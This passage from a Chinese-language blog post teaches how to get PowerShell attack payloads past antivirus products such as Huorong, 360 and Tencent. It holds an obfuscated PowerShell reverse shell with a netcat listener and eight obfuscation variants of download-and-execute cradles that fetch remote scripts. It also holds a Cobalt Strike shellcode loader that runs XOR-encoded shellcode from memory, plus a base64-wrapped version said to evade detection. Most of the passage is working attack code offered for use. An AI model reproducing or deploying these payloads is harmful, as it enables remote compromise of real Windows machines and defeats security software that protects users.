class="string">&#x27;ASC&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ding&#x27;</span>,<span class="string">&#x27;o&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;Sys&#x27;</span>,<span class="string">&#x27;tem.T&#x27;</span>),<span class="string">&#x27;c&#x27;</span>)).<span class="string">&quot;g`e`TSTRiNg&quot;</span>(<span class="variable">$</span>&#123;bYT`Es&#125;,<span class="number">0</span>, <span class="variable">$</span>&#123;I&#125;));.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t-Va&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ble&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)) <span class="literal">-Value</span> (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ie&#x27;</span>,<span class="string">&#x27;x&#x27;</span>) <span class="variable">$</span>&#123;D`ATA&#125; <span class="number">2</span>&gt;&amp;<span class="number">1</span> | .(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;Ou&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;t-Stri&#x27;</span>,<span class="string">&#x27;n&#x27;</span>)) ) <span class="literal">-Name</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;ndba&#x27;</span>),<span class="string">&#x27;k&#x27;</span>);.(<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Va&#x27;</span>,<span class="string">&#x27;riabl&#x27;</span>),<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t-&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;sE`NDBack&#125; + <span class="string">&quot;PS &quot;</span> + (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;wd&#x27;</span>)).<span class="string">&quot;P`ATH&quot;</span> + <span class="string">&quot;&gt; &quot;</span>) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ack2&#x27;</span>,<span class="string">&#x27;db&#x27;</span>));&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;le&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Set-&#x27;</span>,<span class="string">&#x27;Va&#x27;</span>),<span class="string">&#x27;ri&#x27;</span>,<span class="string">&#x27;ab&#x27;</span>) <span class="literal">-Name</span>(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ndbyt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>),<span class="string">&#x27;se&#x27;</span>) <span class="literal">-Value</span> (( ( .(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;tEm&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;W4&#x27;</span>,<span class="string">&#x27;Ble:p&#x27;</span>,<span class="string">&#x27;IA&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;vaR&#x27;</span>)).<span class="string">&quot;vAL`UE&quot;</span>::<span class="string">&quot;Asc`II&quot;</span>).(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Get&#x27;</span>,<span class="string">&#x27;By&#x27;</span>),<span class="string">&#x27;tes&#x27;</span>).<span class="string">&quot;in`VOKE&quot;</span>(<span class="variable">$</span>&#123;SEN`D`BAck2&#125;));<span class="variable">$</span>&#123;str`eam&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Wri&#x27;</span>,<span class="string">&#x27;te&#x27;</span>).<span class="string">&quot;InV`OKE&quot;</span>(<span class="variable">$</span>&#123;S`en`D`BYTE&#125;,<span class="number">0</span>,<span class="variable">$</span>&#123;SeN`D`ByTe&#125;.<span class="string">&quot;lE`NGtH&quot;</span>);<span class="variable">$</span>&#123;ST`R`EaM&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;lus&#x27;</span>),<span class="string">&#x27;h&#x27;</span>).<span class="string">&quot;IN`V`oKe&quot;</span>()&#125;;<span class="variable">$</span>&#123;cl`I`eNT&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;C&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;los&#x27;</span>,<span class="string">&#x27;e&#x27;</span>)).<span class="string">&quot;I`N`Voke&quot;</span>()</span><br></pre></td></tr></table></figure>

<p>åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">.\11.ps1</span><br></pre></td></tr></table></figure>

<p>åœ¨kaliä¸Šè¿›è¡Œç›‘å¬ <code>nc -lvvp 53</code></p>
<p><img src="/posts/adb63639/16.png" alt="æˆªå›¾"></p>
<p>ç«ç»’ä¸æ‹¦æˆª</p>
<p>åœ¨win7è™šæ‹Ÿæœºä¸‹ 360ä¸æ‹¦æˆª</p>
<p><img src="/posts/adb63639/17.png" alt="æˆªå›¾"></p>
<p>ä½†æ˜¯ç°åœ¨360å·²ç»æ‹¦æˆªäº†powershell åªè¦å¼€å¯360(åœ¨win7ä¸‹ä¼šæ‹¦æˆªï¼Œä½†æ˜¯åœ¨win10æµ‹è¯•æ—¶æ²¡æ‹¦æˆª) å°±æ— æ³•å»è°ƒç”¨powershell</p>
<br>

<h3 id="PS1æºæ–‡ä»¶å‘½ä»¤æ··æ·†-è¡Œä¸ºå…æ€"><a href="#PS1æºæ–‡ä»¶å‘½ä»¤æ··æ·†-è¡Œä¸ºå…æ€" class="headerlink" title="PS1æºæ–‡ä»¶å‘½ä»¤æ··æ·†(è¡Œä¸ºå…æ€)"></a>PS1æºæ–‡ä»¶å‘½ä»¤æ··æ·†(è¡Œä¸ºå…æ€)</h3><p>å°½ç®¡powershellä»£ç è‡ªèº«å…æ€ï¼Œä½†æ˜¯åœ¨é€šè¿‡powershellè¿œç¨‹ä¸‹è½½æˆ–è€…æ‰§è¡Œshellcodeæ—¶ï¼Œå¾ˆå®¹æ˜“è¢«æ€è½¯å‘ç°æ‹¦æˆª</p>
<p>å¸¸ç”¨çš„powershellå»æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#x27;&#x27;http://10.10.10.114/shell.ps1&#x27;&#x27;))&quot;</span><br><span class="line"></span><br><span class="line">powershell -NoExit &quot;Invoke-Expression (New-Object Net.WebClient).&quot;D o wn l oad Str in g&quot;(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/adb63639/18.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/19.png" alt="æˆªå›¾"></p>
<p>æ€è½¯ä¾¿ä¼šå¯¹é½è¿›è¡Œæ‹¦æˆª</p>
<p>é€šå¸¸æƒ…å†µä¸‹ å¯ä»¥é€šè¿‡æ›¿æ¢å‡½æ•°è¿›è¡Œbypass</p>
<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<p><code>powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#39;&#39;http://10.10.10.114/shell.ps1&#39;&#39;))&quot;</code></p>
<br>

<p><img src="/posts/adb63639/20.png" alt="æˆªå›¾"></p>
<br>

<ul>
<li>1.å»æ‰Systemå…³é”®è¯</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.10.114:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥+å·è¿æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.ä½¿ç”¨Invokeæ–¹æ³•</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.å˜é‡æ›¿ä»£</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.å…³é”®è¯ä½¿ç”¨å•åŒå¼•å·å¼•èµ·æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.è½¬ä¹‰ç¬¦å·</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.å­—ç¬¦ä¸²åè½¬</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:411.01.01.01//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.ç¼–ç æ‰§è¡Œ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://10.10.10.114:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/21.png" alt="æˆªå›¾"></p>
<p>æ··æ·†ä¹‹åä¸ä¼šè¢«ç«ç»’æ‹¦æˆª</p>
<p><img src="/posts/adb63639/22.png" alt="æˆªå›¾"></p>
<p>æ··æ·†åè…¾è®¯ç®¡å®¶ä¹Ÿå¯ä»¥ç»•è¿‡</p>
<h3 id="base64ç¼–ç powershell-éšæœºåˆ†æ®µ-åƒåœ¾æ³¨é‡Š"><a href="#base64ç¼–ç powershell-éšæœºåˆ†æ®µ-åƒåœ¾æ³¨é‡Š" class="headerlink" title="base64ç¼–ç powershell+éšæœºåˆ†æ®µ+åƒåœ¾æ³¨é‡Š"></a>base64ç¼–ç powershell+éšæœºåˆ†æ®µ+åƒåœ¾æ³¨é‡Š</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Dolt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">	Param ($var_module, $var_procedure)		</span></span><br><span class="line"><span class="string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">	Param (</span></span><br><span class="line"><span class="string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">	)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckt3PCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMT2R3diMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMNEhMNEhMNEhIXIyMjIyM=&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">	$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$Dolt</span>  | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$Dolt</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯csç”ŸæˆåŸå§‹çš„powershell payload</p>
<p>è¿™é‡ŒæŠŠ $Dolt @â€˜â€™@ é‡Œé¢çš„å†…å®¹è¿›è¡Œbase64 ç„¶åå†ä½¿ç”¨ä¸€ä¸ªå˜é‡å»base64è§£ç ï¼Œå†æ›´æ”¹ä¸€ä¸‹å˜é‡å å³å¯ç»•è¿‡ç«ç»’ã€360</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$AAA = @&#x27;</span><br><span class="line">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAK